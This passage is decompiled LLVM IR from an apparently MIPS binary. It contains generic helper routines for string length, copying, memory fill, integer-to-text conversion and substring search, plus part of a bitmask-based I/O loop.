  store i32 %v2_40413c, i32* %gp.global-to-local, align 4
  %v0_40416c = load i32, i32* @v0, align 4
  store i32 %v0_40416c, i32* %v1.global-to-local, align 4
  %v3_404170 = load i32, i32* bitcast (i32** @global_var_44941c.286 to i32*), align 4
  %v2_404178 = inttoptr i32 %v3_404170 to i32*
  store i32 %v0_40416c, i32* %v2_404178, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v0_404180 = load i32, i32* %v1.global-to-local, align 4
  %v2_404180 = icmp eq i32 %v0_404180, -1
  %v1_404188 = icmp sgt i32 %v0_404180, 0
  %or.cond = or i1 %v2_404180, %v1_404188
  br i1 %or.cond, label %dec_label_pc_404334, label %dec_label_pc_40418c

dec_label_pc_40418c:                              ; preds = %dec_label_pc_404134
  %v3_404190 = load i32, i32* @global_var_4493a8.171, align 4
  call void @__pseudo_call(i32 %v3_404190)
  store i32 %v2_40413c, i32* %gp.global-to-local, align 4
  %v2_4041a8 = ptrtoint i32* %tmp11 to i32
  %v2_4041b0 = ptrtoint i32* %tmp12 to i32
  %v2_404288 = ptrtoint i32* %tmp13 to i32
  %v2_404200 = ptrtoint i32* %tmp14 to i32
  br label %dec_label_pc_4041a4

dec_label_pc_4041a4:                              ; preds = %dec_label_pc_4041d0, %dec_label_pc_40418c
  store i32 16, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4041a8

dec_label_pc_4041a8:                              ; preds = %dec_label_pc_404284, %dec_label_pc_4041a4
  store i32 16, i32* %tmp13, align 4
  store i32 %v2_4041b0, i32* %v1.global-to-local, align 4
  store i32 %v2_4041a8, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4041b8

dec_label_pc_4041b8:                              ; preds = %dec_label_pc_4041b8, %dec_label_pc_4041a8
  %v0_4041b8 = phi i32 [ %v1_4041bc, %dec_label_pc_4041b8 ], [ %v2_4041a8, %dec_label_pc_4041a8 ]
  %v1_4041b8 = inttoptr i32 %v0_4041b8 to i32*
  store i32 0, i32* %v1_4041b8, align 4
  %v0_4041bc = load i32, i32* %v0.global-to-local, align 4
  %v1_4041bc = add i32 %v0_4041bc, 4
  store i32 %v1_4041bc, i32* %v0.global-to-local, align 4
  %v1_4041c0 = load i32, i32* %v1.global-to-local, align 4
  %v2_4041c0 = icmp eq i32 %v1_4041bc, %v1_4041c0
  br i1 %v2_4041c0, label %dec_label_pc_4041c4, label %dec_label_pc_4041b8

dec_label_pc_4041c4:                              ; preds = %dec_label_pc_4041b8
  store i32 -1, i32* %v0.global-to-local, align 4
  %v0_4041cc = load i32, i32* %s2.global-to-local, align 4
  %v2_4041cc = icmp eq i32 %v0_4041cc, -1
  %v4_4041cc = udiv i32 %v0_4041cc, 32
  store i32 %v4_4041cc, i32* %s1.global-to-local, align 4
  br i1 %v2_4041cc, label %dec_label_pc_4041c4.dec_label_pc_404234_crit_edge, label %dec_label_pc_4041d0

dec_label_pc_4041c4.dec_label_pc_404234_crit_edge: ; preds = %dec_label_pc_4041c4
  %v0_404234.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_404234

dec_label_pc_4041d0:                              ; preds = %dec_label_pc_4041c4
  store i32 %v2_404288, i32* %v0.global-to-local, align 4
  %v1_4041d8 = mul nuw nsw i32 %v4_4041cc, 4
  %v2_4041dc = add i32 %v1_4041d8, %v2_404288
  %v1_4041e0 = add i32 %v2_4041dc, 28
  %v2_4041e0 = inttoptr i32 %v1_4041e0 to i32*
  %v3_4041e0 = load i32, i32* %v2_4041e0, align 4
  %v1_4041e4 = urem i32 %v0_4041cc, 32
  store i32 %v1_4041e4, i32* @s0, align 4
  %v2_4041ec = shl i32 1, %v1_4041e4
  %v2_4041f0 = or i32 %v3_4041e0, %v2_4041ec
  store i32 %v2_4041f0, i32* %v1.global-to-local, align 4
  store i32 10, i32* %v0.global-to-local, align 4
  %v0_4041f8 = load i32, i32* %gp.global-to-local, align 4
  %v1_4041f8 = add i32 %v0_4041f8, -32144
  %v2_4041f8 = inttoptr i32 %v1_4041f8 to i32*
  %v3_4041f8 = load i32, i32* %v2_4041f8, align 4
  store i32 10, i32* %tmp14, align 4
  store i32 %v2_404200, i32* %v0.global-to-local, align 4
  store i32 %v2_4041f0, i32* %v2_4041e0, align 4
  store i32 0, i32* @a2, align 4
  store i32 0, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_4041f8)
  store i32 %v2_40413c, i32* %gp.global-to-local, align 4
  %v0_404224 = load i32, i32* %v0.global-to-local, align 4
  %v1_404224 = icmp eq i32 %v0_404224, 0
  store i32 %v2_404200, i32* %v1.global-to-local, align 4
  br i1 %v1_404224, label %dec_label_pc_4041a4, label %dec_label_pc_404228

dec_label_pc_404228:                              ; preds = %dec_label_pc_4041d0
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404234

dec_label_pc_404234:                              ; preds = %dec_label_pc_4041c4.dec_label_pc_404234_crit_edge, %dec_label_pc_404228
  %v0_404234 = phi i32 [ %v0_404234.pre, %dec_label_pc_4041c4.dec_label_pc_404234_crit_edge ], [ %v2_40413c, %dec_label_pc_404228 ]
  %v1_404234 = add i32 %v0_404234, -32188
  %v2_404234 = inttoptr i32 %v1_404234 to i32*
  %v3_404234 = load i32, i32* %v2_404234, align 4
  call void @__pseudo_call(i32 %v3_404234)
  %v0_40424c = load i32, i32* %v0.global-to-local, align 4
  %v2_40424c = zext i32 %v0_40424c to i64
  %v4_40424c = mul nuw i64 %v2_40424c, 3435973837
  store i32 %v2_40413c, i32* %gp.global-to-local, align 4
  %v3_404258 = load i32, i32* @global_var_449454.5, align 4
  %v1_4042601 = udiv i64 %v4_40424c, 17179869184
  %v1_404260 = trunc i64 %v1_4042601 to i32
  store i32 %v1_404260, i32* %v1.global-to-local, align 4
  %v1_4042643 = mul nuw nsw i64 %v1_4042601, 4
  %v1_404264 = trunc i64 %v1_4042643 to i32
  %v2_404268.neg = sub i32 %v0_40424c, %v1_404260
  %v2_40426c = sub i32 %v2_404268.neg, %v1_404264
  store i32 %v2_40426c, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_404258)
  %v0_404280 = load i32, i32* %v1.global-to-local, align 4
  %v2_404280 = icmp eq i32 %v0_404280, %v2_40426c
  %v3_404280 = load i32, i32* %s1.global-to-local, align 4
  %v4_404280 = mul i32 %v3_404280, 4
  store i32 %v4_404280, i32* %v0.global-to-local, align 4
  br i1 %v2_404280, label %dec_label_pc_404324, label %dec_label_pc_404284

dec_label_pc_404284:                              ; preds = %dec_label_pc_404234
  store i32 %v2_404288, i32* @a2, align 4
  %v2_40428c = add i32 %v4_404280, %v2_404288
  store i32 %v2_40428c, i32* %v0.global-to-local, align 4
  %v1_404290 = add i32 %v2_40428c, 28
  %v2_404290 = inttoptr i32 %v1_404290 to i32*
  %v3_404290 = load i32, i32* %v2_404290, align 4
  %v1_404298 = load i32, i32* @s0, align 4
  %tmp17 = shl i32 1, %v1_404298
  %v1_40429c6 = and i32 %tmp17, %v3_404290
  %v1_4042a0 = icmp eq i32 %v1_40429c6, 0
  store i32 16, i32* %v0.global-to-local, align 4
  br i1 %v1_4042a0, label %dec_label_pc_4041a8, label %dec_label_pc_4042a4

dec_label_pc_4042a4:                              ; preds = %dec_label_pc_404284
  %v3_4042a8 = load i32, i32* @global_var_449408.292, align 4
  call void @__pseudo_call(i32 %v3_4042a8)
  store i32 %v2_40413c, i32* %gp.global-to-local, align 4
  %v3_4042c0 = load i32, i32* bitcast (i32** @global_var_44930c.294 to i32*), align 4
  call void @__pseudo_call(i32 %v3_4042c0)
  store i32 %v2_40413c, i32* %gp.global-to-local, align 4
  %v3_4042d8 = load i32, i32* @global_var_4493b8.296, align 4
  call void @__pseudo_call(i32 %v3_4042d8)
  store i32 %v2_40413c, i32* %gp.global-to-local, align 4
  %v3_4042f0 = load i32, i32* @global_var_4492b8.298, align 4
  call void @__pseudo_call(i32 %v3_4042f0)
  store i32 %v2_40413c, i32* %gp.global-to-local, align 4
  %v3_404308 = load i32, i32* @global_var_4492f8, align 4
  store i32 %v3_404308, i32* %v0.global-to-local, align 4
  %v3_40430c = load i32, i32* @global_var_4493e4.7, align 4
  call void @__pseudo_call(i32 %v3_40430c)
  store i32 %v2_40413c, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_404324

dec_label_pc_404324:                              ; preds = %dec_label_pc_404234, %dec_label_pc_4042a4
  %v3_404324 = load i32, i32* @global_var_4492dc.8, align 4
  call void @__pseudo_call(i32 %v3_404324)
  %v4_404344.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404334

dec_label_pc_404334:                              ; preds = %dec_label_pc_404134, %dec_label_pc_404324
  %v4_404344 = phi i32 [ -1, %dec_label_pc_404134 ], [ %v4_404344.pre, %dec_label_pc_404324 ]
  store i32 %v0_404150, i32* @s0, align 4
  ret i32 %v4_404344

; uselistorder directives
  uselistorder i32 %v4_404280, { 1, 0 }
  uselistorder i32 %v1_4041e4, { 1, 0 }
  uselistorder i32 %v1_4041bc, { 1, 2, 0 }
  uselistorder i32 %v2_404288, { 0, 3, 1, 2 }
  uselistorder i32 %v2_40413c, { 9, 7, 8, 5, 6, 4, 0, 3, 2, 1, 10 }
  uselistorder i32* %tmp14, { 1, 0 }
  uselistorder i32* %tmp13, { 1, 0 }
  uselistorder i32* %v1.global-to-local, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder i32* %v0.global-to-local, { 14, 12, 16, 13, 15, 17, 5, 0, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %gp.global-to-local, { 7, 8, 9, 10, 11, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_404334, { 1, 0 }
  uselistorder label %dec_label_pc_404324, { 1, 0 }
  uselistorder label %dec_label_pc_404234, { 1, 0 }
}

define i32 @function_40434c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40434c:
  %v0_40434c = load i32, i32* @v0, align 4
  ret i32 %v0_40434c
}

define i32 @function_404350() local_unnamed_addr {
dec_label_pc_404350:
  %v0_404358.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_404354

dec_label_pc_404354:                              ; preds = %dec_label_pc_404354, %dec_label_pc_404350
  %v0_404358 = phi i32 [ %v3_404360, %dec_label_pc_404354 ], [ %v0_404358.pre, %dec_label_pc_404350 ]
  %v0_404354 = phi i32 [ %v1_404354, %dec_label_pc_404354 ], [ 0, %dec_label_pc_404350 ]
  %v1_404354 = add i32 %v0_404354, 1
  %v1_404358 = inttoptr i32 %v0_404358 to i8*
  %v2_404358 = load i8, i8* %v1_404358, align 1
  %v1_404360 = icmp eq i8 %v2_404358, 0
  %v3_404360 = add i32 %v0_404358, 1
  br i1 %v1_404360, label %dec_label_pc_404364, label %dec_label_pc_404354

dec_label_pc_404364:                              ; preds = %dec_label_pc_404354
  ret i32 %v1_404354

; uselistorder directives
  uselistorder i32 %v0_404358, { 1, 0 }
}

define i32 @function_404370(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404370:
  %v0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_404374

dec_label_pc_404374:                              ; preds = %dec_label_pc_404374, %dec_label_pc_404370
  %v0_404374 = phi i32 [ %v3_40437c, %dec_label_pc_404374 ], [ %tmp, %dec_label_pc_404370 ]
  %v1_404374 = inttoptr i32 %v0_404374 to i8*
  %v2_404374 = load i8, i8* %v1_404374, align 1
  %v3_404374 = sext i8 %v2_404374 to i32
  store i32 %v3_404374, i32* %v0.global-to-local, align 4
  %v1_40437c = icmp eq i8 %v2_404374, 0
  %v3_40437c = add i32 %v0_404374, 1
  br i1 %v1_40437c, label %dec_label_pc_404380, label %dec_label_pc_404374

dec_label_pc_404380:                              ; preds = %dec_label_pc_404374
  store i32 %v0_404374, i32* @v1, align 4
  br label %dec_label_pc_404388

dec_label_pc_404388:                              ; preds = %dec_label_pc_404388, %dec_label_pc_404380
  %v2_404390 = phi i32 [ %v3_404394, %dec_label_pc_404388 ], [ %v0_404374, %dec_label_pc_404380 ]
  %v0_404388 = load i32, i32* @a1, align 4
  %v1_404388 = inttoptr i32 %v0_404388 to i8*
  %v2_404388 = load i8, i8* %v1_404388, align 1
  %v3_404388 = sext i8 %v2_404388 to i32
  store i32 %v3_404388, i32* %v0.global-to-local, align 4
  %v1_40438c = add i32 %v0_404388, 1
  store i32 %v1_40438c, i32* @a1, align 4
  %v3_404390 = inttoptr i32 %v2_404390 to i8*
  store i8 %v2_404388, i8* %v3_404390, align 1
  %v0_404394 = load i32, i32* %v0.global-to-local, align 4
  %v1_404394 = icmp eq i32 %v0_404394, 0
  %v2_404394 = load i32, i32* @v1, align 4
  %v3_404394 = add i32 %v2_404394, 1
  store i32 %v3_404394, i32* @v1, align 4
  br i1 %v1_404394, label %dec_label_pc_404398, label %dec_label_pc_404388

dec_label_pc_404398:                              ; preds = %dec_label_pc_404388
  store i32 %tmp, i32* %v0.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_404394, { 1, 0 }
  uselistorder i32 %v0_404374, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
}

define i32 @function_4043a4() local_unnamed_addr {
dec_label_pc_4043a4:
  %v0_4043a4 = load i32, i32* @v0, align 4
  ret i32 %v0_4043a4
}

define i32 @function_4043a8() local_unnamed_addr {
dec_label_pc_4043a8:
  %v1.global-to-local = alloca i32, align 4
  store i32 -1, i32* %v1.global-to-local, align 4
  %v3_4043b4.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_4043ac

dec_label_pc_4043ac:                              ; preds = %dec_label_pc_4043ac, %dec_label_pc_4043a8
  %v3_4043b4 = phi i32 [ %v1_4043b8, %dec_label_pc_4043ac ], [ %v3_4043b4.pre, %dec_label_pc_4043a8 ]
  %v0_4043ac = load i32, i32* @a1, align 4
  %v1_4043ac = inttoptr i32 %v0_4043ac to i8*
  %v2_4043ac = load i8, i8* %v1_4043ac, align 1
  %v1_4043b0 = add i32 %v0_4043ac, 1
  store i32 %v1_4043b0, i32* @a1, align 4
  %v4_4043b4 = inttoptr i32 %v3_4043b4 to i8*
  store i8 %v2_4043ac, i8* %v4_4043b4, align 1
  %v0_4043b8 = load i32, i32* @a0, align 4
  %v1_4043b8 = add i32 %v0_4043b8, 1
  store i32 %v1_4043b8, i32* @a0, align 4
  %v0_4043bc = load i32, i32* @a2, align 4
  %v1_4043bc = add i32 %v0_4043bc, -1
  store i32 %v1_4043bc, i32* @a2, align 4
  %v1_4043c0 = load i32, i32* %v1.global-to-local, align 4
  %v2_4043c0 = icmp eq i32 %v1_4043bc, %v1_4043c0
  br i1 %v2_4043c0, label %dec_label_pc_4043c4, label %dec_label_pc_4043ac

dec_label_pc_4043c4:                              ; preds = %dec_label_pc_4043ac
  %v2_4043c8 = sext i8 %v2_4043ac to i32
  ret i32 %v2_4043c8

; uselistorder directives
  uselistorder i32 %v1_4043b8, { 1, 0 }
}

define i32 @function_4043d0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4043d0:
  %s0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %s0.global-to-local, align 4
  %v0_4043f8.pre = load i32, i32* @a2, align 4
  br label %dec_label_pc_4043f8

dec_label_pc_4043f8:                              ; preds = %dec_label_pc_4043f8, %dec_label_pc_4043d0
  %v2_404404 = phi i32 [ %v3_404404, %dec_label_pc_4043f8 ], [ %tmp, %dec_label_pc_4043d0 ]
  %v0_4043f8 = phi i32 [ %v1_404400, %dec_label_pc_4043f8 ], [ %v0_4043f8.pre, %dec_label_pc_4043d0 ]
  store i32 %v0_4043f8, i32* %s0.global-to-local, align 4
  %v1_4043fc = inttoptr i32 %v2_404404 to i8*
  %v2_4043fc = load i8, i8* %v1_4043fc, align 1
  %v3_4043fc = sext i8 %v2_4043fc to i32
  store i32 %v3_4043fc, i32* @v0, align 4
  %v1_404400 = add i32 %v0_4043f8, 1
  store i32 %v1_404400, i32* @a2, align 4
  %v1_404404 = icmp eq i8 %v2_4043fc, 0
  %v3_404404 = add i32 %v2_404404, 1
  br i1 %v1_404404, label %dec_label_pc_404408, label %dec_label_pc_4043f8

dec_label_pc_404408:                              ; preds = %dec_label_pc_4043f8
  %v1_404414 = call i32 @function_4043a4()
  %v0_40441c = load i32, i32* %s0.global-to-local, align 4
  ret i32 %v0_40441c

; uselistorder directives
  uselistorder i32 %v1_404400, { 1, 0 }
  uselistorder i32 %v0_4043f8, { 1, 0 }
  uselistorder i32 ()* @function_4043a4, { 1, 2, 0 }
}

define i32 @function_404434(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404434:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %v1_404434 = mul i32 %arg1, 16777216
  %v1_404438 = sdiv i32 %v1_404434, 16777216
  store i32 %v1_404438, i32* %a1.global-to-local, align 4
  %v2_404444.pre = load i32, i32* @a0, align 4
  %extract.t8 = trunc i32 %v1_404438 to i8
  %v3_4044449 = inttoptr i32 %v2_404444.pre to i8*
  store i8 %extract.t8, i8* %v3_4044449, align 1
  %v0_40444810 = load i32, i32* @a0, align 4
  %v1_40444811 = add i32 %v0_40444810, 1
  store i32 %v1_40444811, i32* %a0.global-to-local, align 4
  %v0_40444c12 = load i32, i32* @a2, align 4
  %v1_40444c13 = add i32 %v0_40444c12, -1
  store i32 %v1_40444c13, i32* @a2, align 4
  %v2_40445014 = icmp eq i32 %v0_40444c12, 0
  br i1 %v2_40445014, label %dec_label_pc_404454, label %dec_label_pc_404444.dec_label_pc_404444_crit_edge

dec_label_pc_404444.dec_label_pc_404444_crit_edge: ; preds = %dec_label_pc_404434, %dec_label_pc_404444.dec_label_pc_404444_crit_edge
  %v1_40444815 = phi i32 [ %v1_404448, %dec_label_pc_404444.dec_label_pc_404444_crit_edge ], [ %v1_40444811, %dec_label_pc_404434 ]
  %v0_404444.pre = load i32, i32* %a1.global-to-local, align 4
  %extract.t = trunc i32 %v0_404444.pre to i8
  %v3_404444 = inttoptr i32 %v1_40444815 to i8*
  store i8 %extract.t, i8* %v3_404444, align 1
  %v0_404448 = load i32, i32* %a0.global-to-local, align 4
  %v1_404448 = add i32 %v0_404448, 1
  store i32 %v1_404448, i32* %a0.global-to-local, align 4
  %v0_40444c = load i32, i32* @a2, align 4
  %v1_40444c = add i32 %v0_40444c, -1
  store i32 %v1_40444c, i32* @a2, align 4
  %v2_404450 = icmp eq i32 %v0_40444c, 0
  br i1 %v2_404450, label %dec_label_pc_404454, label %dec_label_pc_404444.dec_label_pc_404444_crit_edge

dec_label_pc_404454:                              ; preds = %dec_label_pc_404444.dec_label_pc_404444_crit_edge, %dec_label_pc_404434
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_404448, { 1, 0 }
  uselistorder i32 %v1_404438, { 1, 0 }
  uselistorder i32* %a0.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_404444.dec_label_pc_404444_crit_edge, { 1, 0 }
}

define i32 @function_404460(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_404460:
  %a0.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %lo.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 %tmp, i32* @a2, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_40447c = load i32, i32* @a2, align 4
  %v1_40447c = icmp eq i32 %v0_40447c, 0
  store i32 %v0_40447c, i32* @s0, align 4
  br i1 %v1_40447c, label %dec_label_pc_40453c, label %dec_label_pc_404480

dec_label_pc_404480:                              ; preds = %dec_label_pc_404460
  %v0_404484 = load i32, i32* %a0.global-to-local, align 4
  %v1_404484 = icmp eq i32 %v0_404484, 0
  br i1 %v1_404484, label %dec_label_pc_404534, label %dec_label_pc_404488

dec_label_pc_404488:                              ; preds = %dec_label_pc_404480
  %v2_404490 = icmp ne i32 %arg2, 10
  store i32 0, i32* %t0.global-to-local, align 4
  %v1_404498 = icmp sgt i32 %v0_404484, -1
  %or.cond = or i1 %v2_404490, %v1_404498
  br i1 %or.cond, label %dec_label_pc_4044a8, label %dec_label_pc_40449c

dec_label_pc_40449c:                              ; preds = %dec_label_pc_404488
  %v1_4044a0 = sub i32 0, %v0_404484
  store i32 %v1_4044a0, i32* %a0.global-to-local, align 4
  store i32 1, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_4044a8

dec_label_pc_4044a8:                              ; preds = %dec_label_pc_404488, %dec_label_pc_40449c
  %v2_4044b82 = phi i32 [ %v0_404484, %dec_label_pc_404488 ], [ %v1_4044a0, %dec_label_pc_40449c ]
  store i32 32, i32* %a2.global-to-local, align 4
  %v2_4044ac = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_4044ac, i32* %t1.global-to-local, align 4
  br label %dec_label_pc_4044b8

dec_label_pc_4044b8:                              ; preds = %dec_label_pc_4044e4, %dec_label_pc_4044a8
  %v1_4044e4 = phi i32 [ %v1_4044ec, %dec_label_pc_4044e4 ], [ 32, %dec_label_pc_4044a8 ]
  %v2_4044d8 = phi i32 [ %v0_4044f0, %dec_label_pc_4044e4 ], [ %v2_4044b82, %dec_label_pc_4044a8 ]
  %v4_4044b8 = sdiv i32 %v2_4044d8, %arg2
  store i32 %v4_4044b8, i32* %lo.global-to-local, align 4
  %v5_4044b8 = srem i32 %v2_4044d8, %arg2
  %v1_4044c8 = icmp slt i32 %v5_4044b8, 10
  %v3_4044cc = add i32 %v5_4044b8, 48
  %extract.t9 = trunc i32 %v3_4044cc to i8
  br i1 %v1_4044c8, label %dec_label_pc_4044e4, label %dec_label_pc_4044d0

dec_label_pc_4044d0:                              ; preds = %dec_label_pc_4044b8
  %v1_4044d4 = add i32 %v5_4044b8, 55
  store i32 %v4_4044b8, i32* %lo.global-to-local, align 4
  %extract.t = trunc i32 %v1_4044d4 to i8
  br label %dec_label_pc_4044e4

dec_label_pc_4044e4:                              ; preds = %dec_label_pc_4044d0, %dec_label_pc_4044b8
  %v0_4044e8.off0 = phi i8 [ %extract.t, %dec_label_pc_4044d0 ], [ %extract.t9, %dec_label_pc_4044b8 ]
  %v0_4044e4 = load i32, i32* %t1.global-to-local, align 4
  %v2_4044e4 = add i32 %v0_4044e4, %v1_4044e4
  %v3_4044e8 = inttoptr i32 %v2_4044e4 to i8*
  store i8 %v0_4044e8.off0, i8* %v3_4044e8, align 1
  %v0_4044ec = load i32, i32* %a2.global-to-local, align 4
  %v1_4044ec = add i32 %v0_4044ec, -1
  store i32 %v1_4044ec, i32* %a2.global-to-local, align 4
  %v0_4044f0 = load i32, i32* %lo.global-to-local, align 4
  store i32 %v0_4044f0, i32* %a0.global-to-local, align 4
  %v1_4044f4 = icmp eq i32 %v0_4044f0, 0
  br i1 %v1_4044f4, label %dec_label_pc_4044f8, label %dec_label_pc_4044b8

dec_label_pc_4044f8:                              ; preds = %dec_label_pc_4044e4
  %v0_4044fc = load i32, i32* %t0.global-to-local, align 4
  %v1_4044fc = icmp eq i32 %v0_4044fc, 0
  br i1 %v1_4044fc, label %dec_label_pc_404510, label %dec_label_pc_404500

dec_label_pc_404500:                              ; preds = %dec_label_pc_4044f8
  %v2_4044fc = load i32, i32* @sp, align 4
  %v4_4044fc = add i32 %v2_4044fc, %v1_4044ec
  %v3_40450c = add i32 %v4_4044fc, 24
  %v4_40450c = inttoptr i32 %v3_40450c to i8*
  store i8 45, i8* %v4_40450c, align 1
  %v0_404510.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_404510

dec_label_pc_404510:                              ; preds = %dec_label_pc_4044f8, %dec_label_pc_404500
  %v0_404510 = phi i32 [ %v1_4044ec, %dec_label_pc_4044f8 ], [ %v0_404510.pre, %dec_label_pc_404500 ]
  %v1_404510 = add i32 %v0_404510, 1
  store i32 %v1_404510, i32* @a2, align 4
  %v3_404514 = load i32, i32* @global_var_4492ec.198, align 4
  store i32 %v3_404514, i32* @t9, align 4
  %v2_40451c = add i32 %v1_404510, %v2_4044ac
  %v1_404520 = load i32, i32* @s0, align 4
  %v2_404520 = inttoptr i32 %v1_404520 to i8*
  store i32 %v1_404520, i32* %a0.global-to-local, align 4
  %v7_404520 = call i32 @function_4043d0(i8* %v2_404520, i32 %v2_40451c)
  %v0_404530 = load i32, i32* @s0, align 4
  %v2_404534.pre = load i32, i32* @a2, align 4
  %extract.t10 = trunc i32 %v0_404530 to i8
  br label %dec_label_pc_404534

dec_label_pc_404534:                              ; preds = %dec_label_pc_404480, %dec_label_pc_404510
  %v2_404534 = phi i32 [ %v0_40447c, %dec_label_pc_404480 ], [ %v2_404534.pre, %dec_label_pc_404510 ]
  %v0_404534.off0 = phi i8 [ 48, %dec_label_pc_404480 ], [ %extract.t10, %dec_label_pc_404510 ]
  %v3_404534 = inttoptr i32 %v2_404534 to i8*
  store i8 %v0_404534.off0, i8* %v3_404534, align 1
  %v0_404538 = load i32, i32* @a2, align 4
  %v1_404538 = add i32 %v0_404538, 1
  %v2_404538 = inttoptr i32 %v1_404538 to i8*
  store i8 0, i8* %v2_404538, align 1
  %v0_40453c.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_40453c

dec_label_pc_40453c:                              ; preds = %dec_label_pc_404460, %dec_label_pc_404534
  %v0_40453c = phi i32 [ 0, %dec_label_pc_404460 ], [ %v0_40453c.pre, %dec_label_pc_404534 ]
  ret i32 %v0_40453c

; uselistorder directives
  uselistorder i32 %v1_404520, { 1, 0 }
  uselistorder i32 %v0_4044f0, { 1, 2, 0 }
  uselistorder i32 %v1_4044ec, { 1, 0, 3, 2 }
  uselistorder i32 %v5_4044b8, { 0, 2, 1 }
  uselistorder i32 %v2_4044d8, { 1, 0 }
  uselistorder i32 %v0_404484, { 0, 2, 1, 3 }
  uselistorder i32* %t0.global-to-local, { 1, 0, 2 }
  uselistorder i32* %lo.global-to-local, { 1, 0, 2 }
  uselistorder i32* %a0.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_40453c, { 1, 0 }
  uselistorder label %dec_label_pc_404534, { 1, 0 }
  uselistorder label %dec_label_pc_404510, { 1, 0 }
  uselistorder label %dec_label_pc_4044a8, { 1, 0 }
}

define i32 @function_404550(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404550:
  store i32 %arg4, i32* @a3, align 4
  %v2_404550 = icmp sgt i32 %arg4, %arg2
  br i1 %v2_404550, label %dec_label_pc_4045a8, label %dec_label_pc_404558

dec_label_pc_404558:                              ; preds = %dec_label_pc_404550
  %v0_404564.pre = load i32, i32* @v1, align 4
  %v0_404568.pre = load i32, i32* @t1, align 4
  br label %dec_label_pc_404564

dec_label_pc_404564:                              ; preds = %dec_label_pc_404594, %dec_label_pc_404558
  %v0_404578 = phi i32 [ %v3_4045a0, %dec_label_pc_404594 ], [ 0, %dec_label_pc_404558 ]
  %v3_404578 = phi i32 [ %v1_40459c, %dec_label_pc_404594 ], [ 0, %dec_label_pc_404558 ]
  %v0_404568 = phi i32 [ %v2_404598, %dec_label_pc_404594 ], [ %v0_404568.pre, %dec_label_pc_404558 ]
  %v0_404564 = phi i32 [ %v2_40459c, %dec_label_pc_404594 ], [ %v0_404564.pre, %dec_label_pc_404558 ]
  %v1_404564 = inttoptr i32 %v0_404564 to i8*
  %v2_404564 = load i8, i8* %v1_404564, align 1
  %v1_404568 = inttoptr i32 %v0_404568 to i8*
  %v2_404568 = load i8, i8* %v1_404568, align 1
  %v2_404570 = icmp eq i8 %v2_404564, %v2_404568
  br i1 %v2_404570, label %dec_label_pc_404574, label %dec_label_pc_40458c

dec_label_pc_404574:                              ; preds = %dec_label_pc_404564
  %v2_404578 = icmp eq i32 %v0_404578, %arg4
  %v4_404578 = add i32 %v3_404578, 1
  br i1 %v2_404578, label %dec_label_pc_40457c, label %dec_label_pc_404594

dec_label_pc_40457c:                              ; preds = %dec_label_pc_404574
  ret i32 %v4_404578

dec_label_pc_40458c:                              ; preds = %dec_label_pc_404564
  %v1_404590 = add i32 %v3_404578, 1
  br label %dec_label_pc_404594

dec_label_pc_404594:                              ; preds = %dec_label_pc_404574, %dec_label_pc_40458c
  %v2_4045a0 = phi i32 [ %v0_404578, %dec_label_pc_404574 ], [ 0, %dec_label_pc_40458c ]
  %v1_40459c = phi i32 [ %v4_404578, %dec_label_pc_404574 ], [ %v1_404590, %dec_label_pc_40458c ]
  %v2_404594 = icmp slt i32 %v1_40459c, %arg2
  %v2_404598 = add i32 %v2_4045a0, %arg3
  %v2_40459c = add i32 %v1_40459c, %arg1
  %v1_4045a0 = icmp eq i1 %v2_404594, false
  %v3_4045a0 = add i32 %v2_4045a0, 1
  br i1 %v1_4045a0, label %dec_label_pc_4045a8, label %dec_label_pc_404564

dec_label_pc_4045a8:                              ; preds = %dec_label_pc_404594, %dec_label_pc_404550
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_40459c, { 0, 2, 1 }
  uselistorder i32 %v2_4045a0, { 1, 0 }
  uselistorder i32 %v4_404578, { 1, 0 }
  uselistorder i32 %v3_404578, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_404594, { 1, 0 }
}

define i32 @function_4045b0(i64 %arg1) local_unnamed_addr {
dec_label_pc_4045b0:
  %tmp = trunc i64 %arg1 to i32
